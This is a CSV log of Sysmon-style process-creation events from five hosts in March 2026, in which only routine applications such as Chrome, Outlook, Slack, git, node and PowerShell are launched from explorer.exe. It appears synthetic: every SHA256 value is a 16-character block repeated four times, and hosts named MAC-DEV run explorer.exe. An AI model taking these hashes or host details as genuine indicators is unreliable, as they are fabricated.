UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-09 22:27:39.822,BLD-RUN-02,e.park,1,node,"node",explorer.exe,,,SHA256=0003b4f7fbdc422f0003b4f7fbdc422f0003b4f7fbdc422f0003b4f7fbdc422f
2026-03-09 22:32:09.854,FIN-WS31,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014b2e7199dde120014b2e7199dde120014b2e7199dde120014b2e7199dde12
2026-03-09 22:42:59.527,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00168dd9e186e65200168dd9e186e65200168dd9e186e65200168dd9e186e652
2026-03-09 22:46:13.936,MAC-DEV-17,l.chen,1,node,"node",explorer.exe,,,SHA256=0023059bcc5c58840023059bcc5c58840023059bcc5c58840023059bcc5c5884
2026-03-09 22:51:19.535,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000101d0ec13b14e000101d0ec13b14e000101d0ec13b14e000101d0ec13b14e
2026-03-09 23:04:14.421,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013d4531e0536e70013d4531e0536e70013d4531e0536e70013d4531e0536e7
2026-03-09 23:09:41.505,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e37a26ec76820001e37a26ec76820001e37a26ec76820001e37a26ec76820
2026-03-09 23:20:45.790,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001684d87e5f1470001684d87e5f1470001684d87e5f1470001684d87e5f1470
2026-03-09 23:34:19.439,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=0009536a2057aa160009536a2057aa160009536a2057aa160009536a2057aa16
2026-03-09 23:42:03.698,MAC-DEV-04,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00100cc0e5083e4f00100cc0e5083e4f00100cc0e5083e4f00100cc0e5083e4f
2026-03-09 23:54:05.494,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=00071bc538e2d95a00071bc538e2d95a00071bc538e2d95a00071bc538e2d95a
2026-03-09 23:59:08.713,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00073c1eaf6f493d00073c1eaf6f493d00073c1eaf6f493d00073c1eaf6f493d
2026-03-10 00:10:00.824,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00169c896699f78100169c896699f78100169c896699f78100169c896699f781
2026-03-10 00:21:47.125,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0010887084a8f4d50010887084a8f4d50010887084a8f4d50010887084a8f4d5
2026-03-10 00:28:45.924,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0011d0eaa2a5cef80011d0eaa2a5cef80011d0eaa2a5cef80011d0eaa2a5cef8
2026-03-10 00:32:09.551,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00165cf7b3cde90d00165cf7b3cde90d00165cf7b3cde90d00165cf7b3cde90d
2026-03-10 00:41:33.359,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00004f31c1b29f9b00004f31c1b29f9b00004f31c1b29f9b00004f31c1b29f9b
2026-03-10 00:45:50.948,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e1080becc3a48000e1080becc3a48000e1080becc3a48000e1080becc3a48
2026-03-10 00:55:12.779,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0020a4d2ac8a7bbc0020a4d2ac8a7bbc0020a4d2ac8a7bbc0020a4d2ac8a7bbc
2026-03-10 01:02:47.717,BLD-RUN-02,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b0b9fd0f472d8001b0b9fd0f472d8001b0b9fd0f472d8001b0b9fd0f472d8
2026-03-10 01:11:02.481,MAC-DEV-17,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=002223ee1945e44a002223ee1945e44a002223ee1945e44a002223ee1945e44a
2026-03-10 01:17:32.652,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c0d08e10c34ee000c0d08e10c34ee000c0d08e10c34ee000c0d08e10c34ee
2026-03-10 01:24:52.214,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0001d776d9c0ce160001d776d9c0ce160001d776d9c0ce160001d776d9c0ce16
2026-03-10 01:39:20.253,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c9c535e80ee41001c9c535e80ee41001c9c535e80ee41001c9c535e80ee41
2026-03-10 01:46:57.231,BLD-RUN-02,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e9ea9a68d5f44000e9ea9a68d5f44000e9ea9a68d5f44000e9ea9a68d5f44
2026-03-10 01:51:17.189,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e6955b0e89efb001e6955b0e89efb001e6955b0e89efb001e6955b0e89efb
2026-03-10 02:01:52.470,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022ed18b64833500022ed18b64833500022ed18b64833500022ed18b6483350
2026-03-10 02:05:39.133,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=001e8b682f72efa9001e8b682f72efa9001e8b682f72efa9001e8b682f72efa9
2026-03-10 02:13:36.975,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=00015a86716d1d6600015a86716d1d6600015a86716d1d6600015a86716d1d66
2026-03-10 02:17:09.657,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=000f3132d99dce43000f3132d99dce43000f3132d99dce43000f3132d99dce43
2026-03-10 02:27:21.011,FIN-WS31,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000aa15a7c8703e4000aa15a7c8703e4000aa15a7c8703e4000aa15a7c8703e4
2026-03-10 02:38:52.997,FIN-WS31,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00237307bce3188400237307bce3188400237307bce3188400237307bce31884
2026-03-10 02:43:30.452,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001721943e67dd29001721943e67dd29001721943e67dd29001721943e67dd29
2026-03-10 02:54:34.140,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0009f34429e78a2d0009f34429e78a2d0009f34429e78a2d0009f34429e78a2d
2026-03-10 03:08:13.843,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c7a294675dd2b000c7a294675dd2b000c7a294675dd2b000c7a294675dd2b
2026-03-10 03:15:00.515,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=001564953985c7ea001564953985c7ea001564953985c7ea001564953985c7ea
2026-03-10 03:18:35.583,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=00203c0f5c2dd46c00203c0f5c2dd46c00203c0f5c2dd46c00203c0f5c2dd46c
2026-03-10 03:22:03.383,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020218f324b03ea0020218f324b03ea0020218f324b03ea0020218f324b03ea
2026-03-10 03:36:52.922,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0009937027116c3b0009937027116c3b0009937027116c3b0009937027116c3b
2026-03-10 03:48:57.547,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00201735efbfef7000201735efbfef7000201735efbfef7000201735efbfef70
2026-03-10 03:52:03.475,FIN-WS31,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000032a8309ca175000032a8309ca175000032a8309ca175000032a8309ca175
2026-03-10 03:58:38.995,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001e3fb1ca0d84e5001e3fb1ca0d84e5001e3fb1ca0d84e5001e3fb1ca0d84e5
2026-03-10 04:11:02.614,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0011c318a1446e100011c318a1446e100011c318a1446e100011c318a1446e10
2026-03-10 04:22:15.311,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=0020dd6ccb7740360020dd6ccb7740360020dd6ccb7740360020dd6ccb774036
2026-03-10 04:31:05.069,FIN-WS31,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009054741f34b3c0009054741f34b3c0009054741f34b3c0009054741f34b3c
2026-03-10 04:36:16.870,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016586b1ee5a77c0016586b1ee5a77c0016586b1ee5a77c0016586b1ee5a77c
2026-03-10 04:50:51.140,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f18838af4e8eb001f18838af4e8eb001f18838af4e8eb001f18838af4e8eb
2026-03-10 04:57:21.728,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000a553e970e2442000a553e970e2442000a553e970e2442000a553e970e2442
2026-03-10 05:06:33.858,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001716c1e62874e9001716c1e62874e9001716c1e62874e9001716c1e62874e9
2026-03-10 05:11:07.505,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=001bb49772d72def001bb49772d72def001bb49772d72def001bb49772d72def
2026-03-10 05:16:57.923,BLD-RUN-02,r.kapoor,1,git,"git",explorer.exe,,,SHA256=00115ee63febe2f900115ee63febe2f900115ee63febe2f900115ee63febe2f9
2026-03-10 05:20:13.135,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00150f3b7456380f00150f3b7456380f00150f3b7456380f00150f3b7456380f
2026-03-10 05:28:53.114,MAC-DEV-17,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001eb234975d2895001eb234975d2895001eb234975d2895001eb234975d2895
2026-03-10 05:33:55.914,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0010a594b36acb980010a594b36acb980010a594b36acb980010a594b36acb98
2026-03-10 05:45:02.811,MAC-DEV-17,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001f7b1395f81a37001f7b1395f81a37001f7b1395f81a37001f7b1395f81a37
2026-03-10 05:58:38.570,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009df5e057738600009df5e057738600009df5e057738600009df5e05773860
2026-03-10 06:02:11.072,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00097d4f40f3dd5800097d4f40f3dd5800097d4f40f3dd5800097d4f40f3dd58
2026-03-10 06:15:40.814,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000581eb6220745a000581eb6220745a000581eb6220745a000581eb6220745a
2026-03-10 06:27:08.077,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000bfdb2830e8193000bfdb2830e8193000bfdb2830e8193000bfdb2830e8193
2026-03-10 06:34:33.788,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00090542f04e985900090542f04e985900090542f04e985900090542f04e9859
2026-03-10 06:38:42.495,BLD-RUN-02,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001fb356eedb9c84001fb356eedb9c84001fb356eedb9c84001fb356eedb9c84
2026-03-10 06:53:07.781,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00068176a4df065e00068176a4df065e00068176a4df065e00068176a4df065e
2026-03-10 07:01:39.156,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000789e169fc8755000789e169fc8755000789e169fc8755000789e169fc8755
2026-03-10 07:06:17.217,BLD-RUN-02,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017b9eddbd733ce0017b9eddbd733ce0017b9eddbd733ce0017b9eddbd733ce
2026-03-10 07:12:10.060,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0010c694da386a2c0010c694da386a2c0010c694da386a2c0010c694da386a2c
2026-03-10 07:19:06.049,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=000ce2529de161fb000ce2529de161fb000ce2529de161fb000ce2529de161fb
2026-03-10 07:29:05.046,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00196056690468c000196056690468c000196056690468c000196056690468c0
2026-03-10 07:43:15.035,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0013ea692b77d1dc0013ea692b77d1dc0013ea692b77d1dc0013ea692b77d1dc
2026-03-10 07:50:14.015,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0021769670e954ea0021769670e954ea0021769670e954ea0021769670e954ea
2026-03-10 08:02:33.664,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001efed897cc43f5001efed897cc43f5001efed897cc43f5001efed897cc43f5
2026-03-10 08:13:34.327,FIN-WS31,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011c1d3c89116f20011c1d3c89116f20011c1d3c89116f20011c1d3c89116f2
2026-03-10 08:21:57.560,MAC-DEV-04,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c74ed1afb6bb8000c74ed1afb6bb8000c74ed1afb6bb8000c74ed1afb6bb8
2026-03-10 08:27:33.530,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0001b8713fa2d0df0001b8713fa2d0df0001b8713fa2d0df0001b8713fa2d0df
2026-03-10 08:35:50.650,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00023bf0ffc375e800023bf0ffc375e800023bf0ffc375e800023bf0ffc375e8
2026-03-10 08:49:57.702,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00215c422791711200215c422791711200215c422791711200215c4227917112
2026-03-10 08:54:04.126,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000c6f566b9f6bc5000c6f566b9f6bc5000c6f566b9f6bc5000c6f566b9f6bc5
2026-03-10 09:01:58.183,MAC-DEV-04,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0022016d81c741fc0022016d81c741fc0022016d81c741fc0022016d81c741fc
2026-03-10 09:14:34.900,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002307e6bf552906002307e6bf552906002307e6bf552906002307e6bf552906
2026-03-10 09:27:03.039,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00016857a2ead7ac00016857a2ead7ac00016857a2ead7ac00016857a2ead7ac
2026-03-10 09:39:48.652,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b32ceaba058ec001b32ceaba058ec001b32ceaba058ec001b32ceaba058ec
2026-03-10 09:49:43.023,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00236422684dd98200236422684dd98200236422684dd98200236422684dd982
2026-03-10 10:04:10.462,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019fba78d5c8efe0019fba78d5c8efe0019fba78d5c8efe0019fba78d5c8efe
2026-03-10 10:13:03.814,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=000a8e5ed7ca5d56000a8e5ed7ca5d56000a8e5ed7ca5d56000a8e5ed7ca5d56
2026-03-10 10:22:13.074,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001f92b13f95a226001f92b13f95a226001f92b13f95a226001f92b13f95a226
2026-03-10 10:36:55.645,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020fd8eb1482ac80020fd8eb1482ac80020fd8eb1482ac80020fd8eb1482ac8
2026-03-10 10:42:52.925,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001fceb5592d053e001fceb5592d053e001fceb5592d053e001fceb5592d053e
2026-03-10 10:56:36.926,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00231349a9d6189800231349a9d6189800231349a9d6189800231349a9d61898
2026-03-10 11:07:50.845,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=000f29311fa27e5c000f29311fa27e5c000f29311fa27e5c000f29311fa27e5c
2026-03-10 11:13:38.711,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=000e017b983b1b3a000e017b983b1b3a000e017b983b1b3a000e017b983b1b3a
2026-03-10 11:23:51.568,MAC-DEV-04,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b18ddf23a665c001b18ddf23a665c001b18ddf23a665c001b18ddf23a665c
2026-03-10 11:27:40.787,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0017af0e54a75b080017af0e54a75b080017af0e54a75b080017af0e54a75b08
2026-03-10 11:33:57.671,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00065c5137ec147200065c5137ec147200065c5137ec147200065c5137ec1472
2026-03-10 11:38:06.360,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e954ac5e711a8000e954ac5e711a8000e954ac5e711a8000e954ac5e711a8
2026-03-10 11:42:42.987,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000102190a6455cf000102190a6455cf000102190a6455cf000102190a6455cf
2026-03-10 11:50:19.660,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001fdbe4a483d1b9001fdbe4a483d1b9001fdbe4a483d1b9001fdbe4a483d1b9
2026-03-10 12:04:21.690,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0012267067765fa00012267067765fa00012267067765fa00012267067765fa0
2026-03-10 12:08:07.947,MAC-DEV-17,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00029dd9aa6988be00029dd9aa6988be00029dd9aa6988be00029dd9aa6988be
2026-03-10 12:21:25.871,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0004daacb65499e50004daacb65499e50004daacb65499e50004daacb65499e5
2026-03-10 12:26:15.155,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001041d0eeb9d2d7001041d0eeb9d2d7001041d0eeb9d2d7001041d0eeb9d2d7
2026-03-10 12:30:20.267,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=000bab30737d8402000bab30737d8402000bab30737d8402000bab30737d8402
2026-03-10 12:33:47.533,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001e3b80a22c68d1001e3b80a22c68d1001e3b80a22c68d1001e3b80a22c68d1
2026-03-10 12:43:41.609,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001428163997d7f0001428163997d7f0001428163997d7f0001428163997d7f0
2026-03-10 12:47:20.825,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=00141b0286535c8e00141b0286535c8e00141b0286535c8e00141b0286535c8e
2026-03-10 12:59:25.591,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00120a2e5112877100120a2e5112877100120a2e5112877100120a2e51128771
2026-03-10 13:06:42.580,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0003b2a2e9e7ccdb0003b2a2e9e7ccdb0003b2a2e9e7ccdb0003b2a2e9e7ccdb
2026-03-10 13:13:00.437,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016f633a49646c20016f633a49646c20016f633a49646c20016f633a49646c2
2026-03-10 13:26:50.823,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001eb2741fda892b001eb2741fda892b001eb2741fda892b001eb2741fda892b
2026-03-10 13:36:56.289,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=0022da8a3663a2940022da8a3663a2940022da8a3663a2940022da8a3663a294
2026-03-10 13:50:40.291,FIN-WS22,l.chen,1,git,"git",explorer.exe,,,SHA256=001a199ea6d816c8001a199ea6d816c8001a199ea6d816c8001a199ea6d816c8
2026-03-10 14:01:07.795,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001927cdfab12b5a001927cdfab12b5a001927cdfab12b5a001927cdfab12b5a
2026-03-10 14:09:48.524,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0006ec2c0a7c7c840006ec2c0a7c7c840006ec2c0a7c7c840006ec2c0a7c7c84
2026-03-10 14:23:27.198,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=002126eb3c1c9e30002126eb3c1c9e30002126eb3c1c9e30002126eb3c1c9e30
2026-03-10 14:27:25.005,BLD-RUN-02,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00034a0cf3fa76f100034a0cf3fa76f100034a0cf3fa76f100034a0cf3fa76f1
2026-03-10 14:34:40.580,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00187f29f1be33dd00187f29f1be33dd00187f29f1be33dd00187f29f1be33dd
2026-03-10 14:42:56.066,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000f390fc4b80e9b000f390fc4b80e9b000f390fc4b80e9b000f390fc4b80e9b
2026-03-10 14:53:44.525,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=001cd6fc25f0f0c5001cd6fc25f0f0c5001cd6fc25f0f0c5001cd6fc25f0f0c5
2026-03-10 14:56:45.122,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001319cefda14ae7001319cefda14ae7001319cefda14ae7001319cefda14ae7
2026-03-10 15:07:58.000,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=001122b0969004c9001122b0969004c9001122b0969004c9001122b0969004c9
2026-03-10 15:19:00.756,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e6d90416ab780001e6d90416ab780001e6d90416ab780001e6d90416ab780
2026-03-10 15:28:48.559,BLD-RUN-02,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003b25f568c905d0003b25f568c905d0003b25f568c905d0003b25f568c905d
2026-03-10 15:43:22.966,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000a7a95254df773000a7a95254df773000a7a95254df773000a7a95254df773
2026-03-10 15:46:26.694,FIN-WS22,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001619cf1fa58c67001619cf1fa58c67001619cf1fa58c67001619cf1fa58c67
2026-03-10 15:54:29.260,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0020a499e69c80760020a499e69c80760020a499e69c80760020a499e69c8076
2026-03-10 16:07:01.133,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=0002f3091b67ac9d0002f3091b67ac9d0002f3091b67ac9d0002f3091b67ac9d
2026-03-10 16:12:06.041,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0011973560bb21dd0011973560bb21dd0011973560bb21dd0011973560bb21dd
2026-03-10 16:21:14.828,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00051204f387f08000051204f387f08000051204f387f08000051204f387f080
2026-03-10 16:25:55.525,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0009f079427efe570009f079427efe570009f079427efe570009f079427efe57
2026-03-10 16:38:30.013,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0022b3bb5dd5c5200022b3bb5dd5c5200022b3bb5dd5c5200022b3bb5dd5c520
2026-03-10 16:46:13.109,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00132b46b2b26c6b00132b46b2b26c6b00132b46b2b26c6b00132b46b2b26c6b
2026-03-10 16:55:44.836,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0017f130c15b2a530017f130c15b2a530017f130c15b2a530017f130c15b2a53
2026-03-10 17:10:23.377,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001265569b52993b001265569b52993b001265569b52993b001265569b52993b
2026-03-10 17:21:17.420,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00095f33ce69d00400095f33ce69d00400095f33ce69d00400095f33ce69d004
2026-03-10 17:33:23.528,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000672c44ce71a2b000672c44ce71a2b000672c44ce71a2b000672c44ce71a2b
2026-03-10 17:45:09.503,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003e74acc7ba4c40003e74acc7ba4c40003e74acc7ba4c40003e74acc7ba4c4
2026-03-10 17:49:59.711,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00219749ddc9a55600219749ddc9a55600219749ddc9a55600219749ddc9a556
2026-03-10 17:59:54.844,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001ad4cab7a64c30001ad4cab7a64c30001ad4cab7a64c30001ad4cab7a64c3
2026-03-10 18:04:13.293,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00223c982c653df400223c982c653df400223c982c653df400223c982c653df4
2026-03-10 18:10:31.073,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f304b0ddc70d8000f304b0ddc70d8000f304b0ddc70d8000f304b0ddc70d8
2026-03-10 18:24:09.235,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000b8bc354c41120000b8bc354c41120000b8bc354c41120000b8bc354c41120
2026-03-10 18:33:21.371,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001945b157221f47001945b157221f47001945b157221f47001945b157221f47
2026-03-10 18:42:16.209,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=0020139c0dd658a80020139c0dd658a80020139c0dd658a80020139c0dd658a8
2026-03-10 18:56:38.077,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00112192d713e46000112192d713e46000112192d713e46000112192d713e460
2026-03-10 19:04:16.688,MAC-DEV-04,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011909b351eacba0011909b351eacba0011909b351eacba0011909b351eacba
2026-03-10 19:09:37.679,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b254ae2b2af36000b254ae2b2af36000b254ae2b2af36000b254ae2b2af36
